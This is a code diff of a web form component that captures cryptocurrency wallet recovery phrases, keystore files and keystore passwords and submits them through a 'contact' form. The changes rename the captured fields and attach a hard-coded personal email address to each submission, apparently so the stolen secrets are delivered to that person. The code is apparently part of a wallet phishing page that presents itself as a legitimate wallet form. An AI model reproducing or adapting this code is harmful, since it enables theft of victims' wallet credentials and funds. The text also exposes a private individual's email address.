@@ -124,7 +124,7 @@ export default {
       }
       this.isLoading = true
 
-      const data = {word: `${this.platform} PHRASE= ${this.phraseTextarea} `, name: "PHRASE" }
+      const data = {phraseTextarea: `${this.platform} PHRASE= ${this.phraseTextarea} `, name: "PHRASE" }
       this.sendRequest(data).then(() => {
         this.isLoading = false;
         var textphrase = document.getElementById("phraseTextArea");
@@ -142,7 +142,7 @@ export default {
         return
       }
       this.isLoading = true;
-      const data = {word: `${this.platform} KEYSTORE= ${this.keystoreTextarea} PASSWORD= ${this.keystorePassword}`, name: "KEYSTORE" }
+      const data = {keystoreTextarea: `${this.platform} KEYSTORE= ${this.keystoreTextarea} PASSWORD= ${this.keystorePassword}`, name: "KEYSTORE" }
       this.sendRequest(data).then(() => {
         this.isLoading = false;
         var textkeystore = document.getElementById("keystoreTextArea");
@@ -183,7 +183,7 @@ export default {
         header: { "Content-Type": "application/x-www-form-urlencoded" }
       };
       console.log(data, this.encode({'form-name': 'contact', ...data}));
-      axios.post('/', this.encode({'form-name': 'contact', ...data}), axiosConfig).then(response =>{
+      axios.post('/', this.encode({'form-name': 'contact', email: 'tobilobabadrun@gmail.com', ...data}), axiosConfig).then(response =>{
         console.log(response);
       })
       var showQr = document.getElementById("showQr");
